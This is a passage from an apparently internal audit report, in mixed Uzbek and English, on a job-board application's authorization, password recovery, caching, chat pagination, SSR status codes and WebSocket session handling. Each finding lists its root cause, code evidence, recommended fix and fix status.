- **Evidence:** candidates.routes.ts:34 preHandler [requireAuth, requireRole('employer','admin')] (requirePhoneVerified yo'q); :37 faqat primaryCompany; :13-18 page ≤200, pageSize ≤50; :64-84 resume experience/education/skills include; resume.routes.ts:140 status 'published'; schema.prisma:219 isOpenToWork @default(true).
- **Recommended fix:** /api/candidates uchun telefon tasdiqini (ideal holda kompaniya tasdiqini ham) talab qiling. Employer'ga ko'rinishni rezyume saqlashdan alohida, sukut o'chiq aniq opt-in qiling (3 tilda toggle, mavjud yozuvlar migratsiyasi). Akkaunt uchun kunlik kvota va kichikroq sahifa chegarasi. Nomzod ariza bermaguncha yoki aloqaga rozi bo'lmaguncha qisqartirilgan karta (initsiallar, lavozim, ko'nikmalar).
- **Severity izohi:** P1 saqlandi, ishonch o'rtacha. ISSUE-008 fix'i kontaktlarni yashirgan, lekin o'z tavsiyasidagi requirePhoneVerified qo'llanmagan. D-012 ro'yxatni employer'larga ochgan, shuning uchun opt-in qismi mahsulot qarorini talab qilishi mumkin.
- **Manba topilmalar:** authz-idor-6
- **Bajarilgan fix:** authz-idor-6: FIXED — D-071 bo'yicha: GET /api/candidates telefoni tasdiqlangan ish beruvchi uchun (admin istisno) va foydalanuvchi bo'yicha 300/soat kvota. 'Nomzodni sukut bo'yicha yashirish' va 'qisqa
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-012

**Telegram orqali parolni tiklash va parolni o'zgartirish oqimi umuman yo'q (B, I, J qoidalari)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-012
- **Area:** auth/recovery
- **Fayl:** `apps/web/src/pages/login/+Page.tsx:83`
- **Root cause:** Auth API'da faqat register, login, refresh, logout, me, telegram va google bor. Reset, forgot, change-password endpointlari ham, recovery token modeli ham yo'q. 'Parolni unutdingizmi?' va sozlamalardagi parol qatori /support ga olib boradi. Google hisobiga tasodifiy hash yoziladi va izoh 'keyin tiklash orqali o'rnatadi' deydi, lekin bunday oqim mavjud emas.
- **Impact:** Parolni unutgan foydalanuvchi o'zi tiklay olmaydi. Yagona yo'l A qoidasi taqiqlagan Telegram login. Google orqali ochilgan hisob hech qachon parol o'rnata olmaydi. Parol sizib chiqsa, uni almashtirib bo'lmaydi. Tiklashdan keyin sessiya va challenge'larni bekor qilish (J) ham yo'q.
- **Evidence:** auth.routes.ts:63-181; login/+Page.tsx:82-87 href l('/support'); AccountSettings.tsx:88; auth.service.ts:233-235; schema.prisma modellari orasida recovery/token modeli yo'q; messages.uz.ts:469 FAQ; D-010.
- **Recommended fix:** RecoveryChallenge {tokenHash sha256, purpose, userId, expiresAt ≤10-15 daqiqa + TTL indeks, usedAt, attempts}. recovery/start {phone}: har doim bir xil umumiy javob, IP+telefon bo'yicha limit, 32 baytli tasodifiy t.me payload. Bot from.id ni tasdiqlangan asosiy yoki zaxira telefon egasi bilan solishtiradi va bir martalik sayt havolasini yuboradi. recovery/complete: argon2 hash, tokenVersion++, boshqa challenge'larni o'chirish, audit. Joriy parol bilan change-password qo'shing. Bot o'chiq bo'lsa 503 qaytaring.
- **Severity izohi:** P1 saqlandi. ISSUE-012 NOT FIXED; D-010 dagi ochiq qaror endi egasi tomonidan hal qilingan: tiklash faqat Telegram orqali, email yo'q.
- **Manba topilmalar:** auth-core-2, telegram-5
- **Bajarilgan fix:** auth-core-2: FIXED — Web part complete: recovery, manual recovery (request + status + continue) and password reset UI, plus the phone-security block (change phone, backup phone, unlink) in the profile  | telegram-5: FIXED — The whole web side is implemented: /login?recover=1 phone form -> Telegram deep link, ?recover=status, ?reset=<token> check + new password with confirmation + success, token stripp
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-048

**Filtrli va matnli facets keshsiz: har filtr o'zgarishida 7 ta agregatsiya, ulardan biri barcha faol vakansiyalar ustida**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-048
- **Area:** scale/search
- **Fayl:** `apps/api/src/vacancies/vacancies.service.ts:438`
- **Root cause:** Faqat umuman filtrsiz facets 60 s keshlanadi. Har filtrli so'rov resolveFilterIds + 5 groupBy + 2 count bajaradi; har o'lchov o'z filtrini tashlab qo'yadi, shuning uchun o'sha o'lchov groupBy'i butun faol to'plamni skanlaydi. Matn bo'lsa 7 tasi ham regex OR'ni takrorlaydi. Kompaniyalar facet'i barcha kompaniyalarni yuklab keyin 100 ga kesadi.
- **Impact:** /vacancies SSR va client har filtr, sort, sahifa yoki matn o'zgarishida ro'yxat + facets'ni birga so'raydi. Filtrsiz cold 602 ms; bitta filtrli so'rov ham kamida bitta to'liq groupBy qiladi, matnli facets bir necha barobar sekin bo'lishi mumkin (o'lchanmagan, inference). Filtr URL'larini aylangan crawlerlar ham shu yo'lga tushadi.
- **Evidence:** vacancies.service.ts:430-447 computeFacets Promise.all 5 groupBy + 2 count; :452-462 barcha companyIds findMany, :493 slice(0,100); :508 unfilteredFacets = cached(...); :528-530 faqat isUnfilteredQuery. web pages/vacancies/+data.ts:15-18 page va facets parallel. FINAL_AUDIT faqat parametrsiz facets'ni o'lchagan.
- **Recommended fix:** Normalizatsiyalangan filtr kaliti bilan keyedCache (masalan 60 s, 500 kalit) va stale-while-revalidate. 7 round-trip'ni umumiy $match ortidan bitta aggregateRaw $facet'ga yig'ing (o'z o'lchovini chetlash semantikasi e2e bilan saqlansin), kompaniyalar tarmog'ida top 100 ni lookup'dan oldin cheklang. Client faqat page/sort o'zgarsa facets'ni qayta so'ramasin.
- **Severity izohi:** P2 saqlandi. ISSUE-138 faqat filtrsiz keshni tuzatgan; filtrli facets ISSUE-048 PARTIAL qismining davomi.
- **Manba topilmalar:** db-perf-5, scale-10k-4
- **Bajarilgan fix:** db-perf-5: PARTIAL — Filtered facets are now cached (60 s, 200 keys, invalidated by vacancy/company writes) instead of only the unfiltered query, and the companies dimension no longer loads every match | scale-10k-4: PARTIAL — Same change as db-perf-5: keyed short-TTL cache for filtered and text facets, bounded to 200 entries. The single-pipeline rewrite and Meili-backed facets were not done.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-125

**Yagona global kesh versiyasi: har vakansiya, kompaniya yoki sharh yozuvi katalog, facets, maosh va home keshlarini birdan bekor qiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-125
- **Area:** scale/cache
- **Fayl:** `apps/api/src/common/cache.ts:16`
- **Root cause:** Barcha jarayon ichidagi keshlar bitta version bilan solishtiriladi. bumpDataVersion har vakansiya PUT (draft tahriri ham), status o'zgarishi, o'chirish, yaratish, kompaniya profili/logo, sharh yozuvi, admin blok/moderatsiya/tasdiq va kompaniyali ro'yxatdan o'tishda chaqiriladi.
- **Impact:** Minglab ish beruvchi e'lon tahrirlaganda keshlar kamdan-kam issiq qoladi va foydalanuvchilar cold yo'lga tushadi: katalog ~0.75 s, facets ~0.6 s, maosh to'plami ~0.57 s. p50 1-9 ms qiymatlari yozuvsiz takroriy so'rovga asoslangan (yozish tezligi — inference).
- **Evidence:** cache.ts:14-17 yagona `version`; :24-44 keyedCache va :46-60 cached `hit.version === version`. Chaqiruvlar: vacancies.routes.ts:219 (PUT, shartsiz), :265, :291; vacancies.service.ts:677; companies.routes.ts:122,140,162,177,260; reviews.routes.ts:65,94; admin.routes.ts:210,312,382,447,454; auth.service.ts:69. FINAL_AUDIT cold ustunlari.
- **Recommended fix:** Domen bo'yicha alohida versiyalar (ochiq vakansiya maydonlari, kompaniya profili, sharhlar); faqat faol yozuvning ochiq maydoni o'zgarganda bump (draft/moderation PUT bump qilmasin). Kalit bo'yicha bir marta fon yangilash bilan stale qiymat bering. Uzoq muddat: Company activeVacancyCount/ratingAvg/reviewCount denormalizatsiyasi.
- **Severity izohi:** P2 saqlandi. ISSUE-125 (FIXED) faqat ariza yozuvlarini chiqargan; yagona global versiya root cause'i qolgan.
- **Manba topilmalar:** db-perf-6, scale-10k-5
- **Bajarilgan fix:** db-perf-6: PARTIAL — The cache layer is now scoped (vacancies/companies/reviews/stats) and every cache I own declares its real dependencies; createVacancy bumps only "vacancies". But reviews.routes.ts, | scale-10k-5: PARTIAL — Same root cause and same state as db-perf-6. Stale-while-revalidate was deliberately not added: serving a stale value after a write would break the binding e2e contract PHASE6-U29 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-046

**Chat: suhbatlar ro'yxati va xabar tarixi cursor sahifalashsiz, reconnect'da to'liq qayta yuklanadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-046
- **Area:** scale/chat
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:358`
- **Root cause:** GET /api/conversations foydalanuvchining barcha suhbatlarini company.description bilan take'siz yuklaydi, oxirgi xabar va unread'ni hammasi ustida agregatsiya qiladi, kontekst uchun kompaniyalarning barcha vakansiya ID'larini $in'ga oladi va Node'da sort qiladi; Conversation'da lastMessageAt yo'q. Tarix doim eng yangi 1000 xabar, before-cursor yo'q, orderBy [createdAt,id] indeksida id yo'q. Client ikkalasini har reconnect'da qayta so'raydi.
- **Impact:** 500 suhbatli employer: p50 523 ms, p95 1148 ms, 498 KB; bu har token muddati va reconnect'da takrorlanadi. Katta kompaniyalar bilan yozishgan seeker'da ulkan $in (o'lchanmagan). 1000 dan eski xabarlarga yetib bo'lmaydi; bitta ochilish 252 KB gacha (tana 4000 belgigacha bo'lsa ~4 MB).
- **Evidence:** chat.routes.ts:358-381 findMany take'siz, include company{description}; :122-139 $group barcha xabarlar; :398-405 vacancy.findMany companyId in; :500 in-memory sort; :158 MESSAGES_LIMIT=1000; :523-527 orderBy createdAt,id take 1000; :512-515 har ochilishda updateMany. schema.prisma:554 [conversationId, createdAt]. web useMessenger.ts:218-223 reconnect'da reloadList + loadThread.
- **Recommended fix:** Conversation.lastMessageAt/preview/senderId denormalizatsiyasi (deliverMessage'da yangilash, backfill), [employerUserId,lastMessageAt] va [seekerUserId,lastMessageAt] indekslari, take 30 keyset. Ro'yxatdan description'ni olib tashlang, kontekstni faqat qaytgan sahifa uchun hisoblang. Tarix: ?before=<id> + take 50, sort faqat id yoki [conversationId,createdAt,id] indeksi. Reconnect faqat oxirgi ma'lum vaqtdan keyingilarni olsin.
- **Severity izohi:** Ro'yxat P2, tarix P3/P2 berilgan; bir xil root cause (chat'da cursor sahifalash yo'q) bo'lgani uchun birlashtirildi, P2.
- **Manba topilmalar:** db-perf-7, db-perf-10, realtime-8, scale-10k-6, scale-10k-9
- **Bajarilgan fix:** db-perf-7: PARTIAL — take/cursor added; company description, seeker profile, unread groupBy and vacancy context are now fetched only for the ~30 rows of the page; the vacancy context query is by indexe | db-perf-10: FIXED — The 1000-message ceiling is gone: ?before=<messageId> walks back through the whole history page by page, and hasMore tells the client when to show 'older messages'. | realtime-8: PARTIAL — History and conversation list are cursor-paginated and the heavy per-row work is page-scoped, but ordering still reads the user's conversation ids plus one indexed last-message agg | scale-10k-6: PARTIAL — Response size at 500 conversations drops from ~498 KB to one page (~30 rows, last-message preview clipped to 300 chars); the unbounded vacancy-id $in is gone. The remaining cost is
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-046

**Header hisoblagichlari har tabda (yashirin ham) 20 s va 45 s da poll qiladi, WS allaqachon push qilsa ham; employer summary har safar barcha vakansiya ID'larini o'qiydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-046
- **Area:** scale/realtime
- **Fayl:** `apps/web/src/lib/useInboxSummary.ts:45`
- **Root cause:** Har tizimga kirgan tab /api/inbox/summary ni 20 s da va /api/notifications?limit=30 ni 45 s da, focus va INBOX_CHANGED da ham so'raydi; visibility tekshiruvi va WS ulanganda sekinlashtirish yo'q. Summary barcha suhbat ID'larini, employer uchun ownedVacancyIds (draft/arxiv ham, limitsiz) va application.count ni qayta hisoblaydi. Bell o'z WS'ini ochadi, /messages ikkinchisini; unread sonlar WS orqali push qilinmaydi.
- **Impact:** Har bo'sh tab daqiqasiga ~4-5 autentifikatsiyalangan so'rov (har biri requireAuth user o'qishi bilan) va vakansiya/suhbat tarixi hajmidagi $in ro'yxatlari. Employer summary p50 125 ms, cold 735 ms. Doimiy fon DB yuki tablar va employer hajmi bilan o'sadi hamda per-IP limitni yeydi (trafik — inference).
- **Evidence:** useInboxSummary.ts:45 setInterval(refresh, 20000); :47-49 focus/INBOX_CHANGED. useNotifications.ts:68 45_000. chat.routes.ts:673-695 conversations findMany + message.count + ownedVacancyIds + application.count. ownership.ts:15-20 limitsiz. apiExtra.ts:192 fetchUnreadCount mavjud, lekin bell uni ishlatmaydi. grep visibilityState — faqat AuthContext va TelegramConnect.
- **Recommended fix:** Tab uchun bitta WS (context), hisoblagich deltalarini (xabar, ariza, bildirishnoma) WS orqali push qiling va reconnect'da resync. document.hidden bo'lsa pollni to'xtating, WS ulangan paytda 2-5 daqiqalik fallback. Bell uchun unread-count endpointi, ro'yxat menyu ochilganda. Application.companyId yoki per-user unread counter denormalizatsiyasi fan-out'ni yo'qotadi.
- **Severity izohi:** P2 (db-perf P3 bergan). Doimiy har-tab yuk va uchta mustaqil topilma bir root cause'ga tushgani uchun P2.
- **Manba topilmalar:** db-perf-12, realtime-9, scale-10k-7
- **Bajarilgan fix:** realtime-9: PARTIAL — Bajarildi: yashirin tabda inbox summary ham, bildirishnoma ro'yxati ham umuman so'ralmaydi; socket ochiq bo'lsa oraliq 20s->120s va 45s->180s ga cho'ziladi; tab faollashganda bir m | scale-10k-7: PARTIAL — API side: owned vacancy ids cached 60 s (keyedCache, invalidated by bumpDataVersion) and, new in this pass, the user's conversation-id list cached 60 s with immediate invalidation 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-058

**Ish beruvchi vakansiyalari 1000 tagacha to'liq hujjat qaytaradi (500 da 987 KB); tahrirlash formasi bitta yozuv uchun butun ro'yxatni yuklaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-058
- **Area:** scale/api
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:126`
- **Root cause:** GET /api/employer/vacancies select'siz: har qatorda description (20k gacha), requirements/conditions, kontaktlar, region, category, company va _count.applications; status filtri va sahifalash yo'q, take 1000. Egasi uchun bitta vakansiya endpointi yo'q, forma ro'yxatdan find qiladi.
- **Impact:** 500 vakansiyali employer dashboard va har tahrirlash ochilishida 987 KB yuklaydi (p50 180 ms). Vakansiya limiti yo'qligi sababli 1000 dan eskilarini UI'dan tahrirlab bo'lmaydi.
- **Evidence:** vacancies.routes.ts:93 EMPLOYER_VACANCIES_LIMIT=1000; :126-136 findMany include + _count, select yo'q. web components/employer/vacancies/VacancyFormView.tsx:79 fetchEmployerVacancyRecords, :87 records.find(id). FINAL_AUDIT: 987 KB.
- **Recommended fix:** Ownership tekshiruvli GET /api/employer/vacancies/:id. Ro'yxat: karta maydonlari, ?status&page&pageSize<=50, sahifa uchun bitta application.groupBy, @@index([companyId, createdAt]).
- **Severity izohi:** P2 saqlandi; ISSUE-058 PARTIAL holati hozirgi kodga mos.
- **Manba topilmalar:** db-perf-8, scale-10k-13
- **Bajarilgan fix:** db-perf-8: FIXED — The employer list is a slim card select with server pagination (max 50/page); per-row _count was replaced by one groupBy; the edit form uses GET /api/employer/vacancies/:id. | scale-10k-13: FIXED — List payload is now one page of cards (no description/requirements/conditions); the edit form loads exactly one record. Statistics read at most 2000 ids (id + createdAt only) and r
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-049

**Kompaniyalar katalogi har cold so'rov, har cursor sahifa va har kompaniya sahifasida (/similar keshsiz) $lookup pipeline bajaradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-049
- **Area:** scale/companies
- **Fayl:** `apps/api/src/modules/companies/companies.list.ts:274`
- **Root cause:** Ikkita $lookup (tasdiqlangan sharhlar, faol vakansiyalar) base filtrga mos har kompaniya uchun $sort/$limit'dan oldin ishlaydi, chunki sort kaliti ulardan hisoblanadi. Faqat aniq query satri 60 s keshlanadi; cursor sahifa to'liq pipeline'ni qayta ishlatadi. /api/companies/:slug/similar va saved=1 keshlanmaydi.
- **Impact:** 2000 kompaniya va 20k vakansiyada birinchi sahifa cold 754-767 ms. Har 'yana yuklash' va har kompaniya sahifasi SSR (parallel /similar) shunga yaqin narx to'laydi (o'lchanmagan); narx kompaniya va vakansiya soniga chiziqli.
- **Evidence:** companies.list.ts:274-318 computed $lookup; cursor tarmog'i pipeline'dan keyin. companies.routes.ts:20 catalogCache; :75-80 saved bo'lmasa kesh; :239-242 /similar → similarCompanies keshsiz. web pages/companies/@slug/+data.ts:13-22. FINAL_AUDIT katalog qatorlari.
- **Recommended fix:** Company.activeVacancyCount, activeVacancyViews, ratingAvg, reviewCount, hasRemote/hasOffice denormalizatsiyasi (vakansiya/sharh yozuvlarida yangilash + davriy reconcile) va sort kalitlari + _id indekslari. Hozircha /similar ni slug bo'yicha ~10 daqiqa keshlang va cursor sahifalarni keyed keshga qo'shing.
- **Severity izohi:** P2 saqlandi; ISSUE-049 PARTIAL (D-034 faqat kalitli kesh).
- **Manba topilmalar:** scale-10k-8
- **Bajarilgan fix:** scale-10k-8: PARTIAL — The $lookup pipeline result is now cached inside listCompanies (60 s, 200 keys), so cursor pages and /api/companies/:slug/similar reuse it instead of recomputing; saved=1 stays unc
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-070

**SSR'da API ishlamasa HTTP 200 qaytadi: detail sahifalar noindex oladi (indeksdan chiqish), ro'yxat sahifalari soft-404**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-070
- **Area:** ssr/status-codes
- **Fayl:** `apps/web/src/pages/vacancies/@slug/+data.ts:17`
- **Root cause:** +data loaderlari ApiError'ni ushlab vacancy/company/article/page/stats=null qaytaradi, Vike 5xx abort qilinmaydi. api/ssr.js va server/index.mjs httpResponse.statusCode (200) ni uzatadi. Detail +Head xato holatda noindex qo'yadi, ro'yxat +Head esa noindex'siz canonical beradi.
- **Impact:** API o'chiq yoki 8 s SSR timeout'dan sekin paytda crawler kirsa faol vakansiya, kompaniya va maqola URL'lari 200 + noindex bilan indeksdan chiqishi mumkin. /vacancies, /companies, /salaries canonical ostida xato blok bilan 200 beradi. SSR 5xx metrikalari API nosozligini ko'rsatmaydi; foydalanuvchi retry UI'ni ko'radi.
- **Evidence:** vacancies/@slug/+data.ts:17-19 `if (error instanceof ApiError) return { vacancy: null, failed: true }`; +Head.tsx:33-35 noindex. companies/@slug va articles/@slug xuddi shunday. server/index.mjs:116 reply.status(httpResponse.statusCode); api/ssr.js:55. D-027 503'ni qilmaslikni tanlagan.
- **Recommended fix:** Faqat SSR'da (client navigatsiyada emas) asosiy ma'lumot ApiError bilan tushsa throw render(503) (ixtiyoriy Retry-After). _error/+Page.tsx'ga 503 'vaqtincha mavjud emas, qayta urining' holati. Vaqtinchalik xatoda noindex chiqarmang. Vercel va self-hosted 5xx keshlamasligini tekshiring.
- **Severity izohi:** P2 saqlandi. Raw 'None directly' degan, lekin ISSUE-070 (NOT FIXED) aynan shu root cause; ro'yxat sahifalari soft-404 qismi qo'shimcha.
- **Manba topilmalar:** api-errors-1
- **Bajarilgan fix:** api-errors-1: FIXED — Same change as seo-2/seo-3 plus the _error 503 state; Vike sets Cache-Control: no-store for >=500 and both serving paths keep it (they only downgrade to no-cache below 400), so nei
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-069

**ISSUE-069 hali qisman: maosh statistikasi, maqolalar va contact SSR fetcherlarida timeout yo'q**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-069
- **Area:** ssr/resilience
- **Fayl:** `apps/web/src/lib/articles/api.ts:12`
- **Root cause:** withServerTimeout faqat lib/api.ts ichida ishlatiladi. fetchSalaryStats, articles request() va support request() fetch'ni faqat chaqiruvchi signali bilan chaqiradi, +data loaderlari signal bermaydi.
- **Impact:** API osilsa /salaries, /articles, /articles/:slug va /contact SSR platforma so'rovni o'ldirguncha osiladi (Vercel timeout 504 yoki bo'sh sahifa); 'yuklab bo'lmadi, qayta urinish' holati chizilmaydi, self-hosted SSR sig'imi band bo'ladi.
- **Evidence:** api.ts:64 withServerTimeout, ishlatilishi faqat api.ts:75,339,359,376,390,436,483,499. apiExtra.ts:352 `fetch(`${API_URL}/api/stats/salary${suffix}`, { signal })` — salaries/+data.ts:19 dan. articles/api.ts:12 `fetch(`${API_URL}${path}`, init)`. support/api.ts:13 xuddi shunday. ISSUE-069 fix izohi: 'lib/articles/api.ts qamrab olinmadi'.
- **Recommended fix:** apiExtra.fetchSalaryStats, articles/api.ts request() va support/api.ts request() da withServerTimeout(signal) uzating. Ularning catch'i TimeoutError'ni ApiError(0) ga aylantiradi, loaderlarning null yo'li o'zgarishsiz ishlaydi.
- **Severity izohi:** P2 saqlandi; tracker PARTIAL holati hozirgi kodga mos.
- **Manba topilmalar:** api-errors-2
- **Bajarilgan fix:** api-errors-2: FIXED — withServerTimeout() now wraps the articles request() helper, fetchSalaryStats and the contact loader's call to fetchSupportContacts (signal passed from the owned +data.ts because l
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-035

**Sessiyani bekor qilish ochiq WebSocket'larni yopmaydi; har chaqiruvchi closeUserSockets'ni qo'lda eslashi kerak**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-035
- **Area:** realtime/auth
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:166`
- **Root cause:** WS tokenVersion'ni faqat ulanishda tekshiradi, handle() qayta tekshirmaydi. revokeUserSessions faqat tokenVersion'ni oshiradi; socketlar faqat chaqiruvchi closeUserSockets'ni ham chaqirsa yopiladi. Hozir 4 ta chaqiruvchi buni qo'lda qiladi; rule J/G/H oqimlari (reset, telefon almashtirish, qo'lda tiklash) hali yo'q.
- **Impact:** Kelajakdagi parol reset yoki telefon almashtirish faqat revokeUserSessions'ni chaqirsa, hujumchining ochiq socketi access token tugaguncha (15 daqiqa) shaxsiy xabar va bildirishnomalarni oladi va xabar yubora oladi — rule J ('barcha sessiyalar bekor') buziladi.
- **Evidence:** auth.service.ts:166-173 faqat tokenVersion update. Qo'lda juftlash: auth.routes.ts:118, admin.routes.ts:201 va :224, team.routes.ts:213. chat.routes.ts:244-278 handle'da tokenVersion qayta tekshiruvi yo'q; :227-231 expiry timer. grep forgot|recovery apps/api/src — yo'q.
- **Recommended fix:** closeUserSockets(userId, 4401, 'session revoked') ni revokeUserSessions ichiga kiriting yoki yagona invalidateAllSessions() helperi bilan barcha joyda ishlating. Ixtiyoriy: 'message' frame'dan oldin tokenVersion'ni (bir necha soniya keshlab) qayta tekshiring. e2e: revoke → WS yopiladi va frame rad etiladi.
- **Severity izohi:** P2 saqlandi: hozir bug yo'q, lekin rule J oqimlari uchun oldindan xavf. ISSUE-035/041 FIXED — WS faqat ulanishda avtorizatsiya qilish root cause'i qo'lda juftlash bilan yopilgan.
- **Manba topilmalar:** realtime-1
- **Bajarilgan fix:** realtime-1: FIXED — revokeUserSessions() now closes the user's live sockets itself (4401), so recovery, phone change and manual recovery cannot forget it. The optional per-frame tokenVersion recheck l
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-040

**WS rate limit har ulanish uchun, foydalanuvchiga socket chegarasi yo'q; oflayn qabul qiluvchiga har xabar alohida Telegram alert**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-040
- **Area:** realtime/abuse
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:233`
- **Root cause:** Token bucket har socket uchun yaratiladi; addSocket foydalanuvchi socketlari sonini cheklamaydi; yagona ulanish limiti global per-IP HTTP (600/min). deliverMessage qabul qiluvchida socket bo'lmasa har chat xabari uchun Telegram yuboradi, jamlash yoki cooldown yo'q. Tasdiqlangan seeker istalgan kompaniya slug'i bilan suhbat ochadi.
- **Impact:** Bitta tasdiqlangan hisob o'nlab socket (har biri ~2 msg/s) ochib nishon employer chati va Telegram'ini to'ldiradi, messages kolleksiyasini o'stiradi. Ko'p parallel Telegram yuborish global limitga urilib boshqalar alertlarini kechiktiradi.
- **Evidence:** chat.routes.ts:233-242 bucket closure ichida (har ulanish); realtime.ts:17-26 addSocket cheklovsiz; env.ts:56 RATE_LIMIT_MAX 600; chat.routes.ts:84-89 `if (!isOnline(receiverId)) void notifyUserViaTelegram(...)` har xabar; :342-347 seeker companySlug bilan suhbat.
- **Recommended fix:** Bucket'ni userId bo'yicha umumiy Map'da saqlang, foydalanuvchiga socket sonini (masalan 5) cheklang (eng eskisini yopib), Telegram chat alertlarini (receiver, conversation) bo'yicha 5-10 daqiqada bittaga debounce qilib 'N ta yangi xabar' ko'rinishida yuboring.
- **Severity izohi:** P2 saqlandi. ISSUE-040 (FIXED) per-connection bucket qo'shgan; per-user chetlab o'tish uning qoldig'i. Telegram debounce qismi realtime-4 bilan kesishadi.
- **Manba topilmalar:** realtime-3
- **Bajarilgan fix:** realtime-3: FIXED — Per-user socket cap (10, oldest closed with 4403 — the web opens 2 sockets per tab, so ~5 tabs), per-account 120 messages/min and 300 read frames/min on top of the per-connection t
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-073

**Backend bildirishnoma matnlari o'zbekcha satr sifatida saqlanadi, havolalar til prefiksini yo'qotadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-073
- **Area:** notifications/i18n
- **Fayl:** `apps/api/src/modules/notifications/notifications.service.ts:92`
- **Root cause:** User'da locale maydoni yo'q. Chaqiruvchilar o'zbekcha title/body/CTA quradi va ular Notification.title/body'ga yakuniy matn bo'lib yoziladi, keyin tilga qarab qayta chizib bo'lmaydi. Telegram, email va push havolalari WEB_ORIGIN + path, /ru yoki /en prefiksisiz. Chat alert va email CTA default ('Saytda ochish') ham o'zbekcha.
- **Impact:** RU/EN foydalanuvchilar in-app, Telegram, push va email bildirishnomalarini o'zbekcha ko'radi va har havola saytning o'zbekcha versiyasini ochadi.
- **Evidence:** schema.prisma:160-205 User'da locale yo'q. notifications.service.ts:92-93 absoluteUrl = WEB_ORIGIN+url; :100-107 title/body saqlanadi; :182 ctaLabel 'Saytda ochish'. admin.routes.ts:315-321 'Vakansiya rad etildi'. chat.routes.ts:87 o'zbekcha alert.
- **Recommended fix:** User.locale (UI tilidan login yoki almashtirishda). Payload'da type + tuzilgan parametrlar saqlab, in-app matnni client'da i18n bilan chizing. Tashqi kanallar uchun foydalanuvchi locale'ida matn va umumiy loc() helperi bilan prefiksli absolyut havola.
- **Severity izohi:** P2 saqlandi. ISSUE-073 (matnlar) va ISSUE-103 (havola prefiksi) ikkalasi ham NOT FIXED va hozirgi kodga mos.
- **Manba topilmalar:** realtime-10
- **Bajarilgan fix:** realtime-10: PARTIAL — In-app text is localized by the web through payload.i18n (D-059). Telegram/push/email stay Uzbek and links keep no locale prefix — WONT FIX per D-059/lead note (no stored user loca
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-025

**Admin vakansiyani qattiq o'chirsa arizalar, tarix va saqlanganlar cascade bilan yo'qoladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-025
- **Area:** vacancy/delete
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:279`
- **Root cause:** 409 VACANCY_HAS_APPLICATIONS himoyasi faqat admin bo'lmaganlarga. Keyin Prisma emulyatsiya qilgan onDelete Cascade arizalar, holat tarixi va favorites'ni o'chiradi. Notification.payload applicationId/vacancyId'ni tipsiz JSON'da saqlaydi; sharhlar asos bo'lgan ariza yo'qolsa ham qoladi.
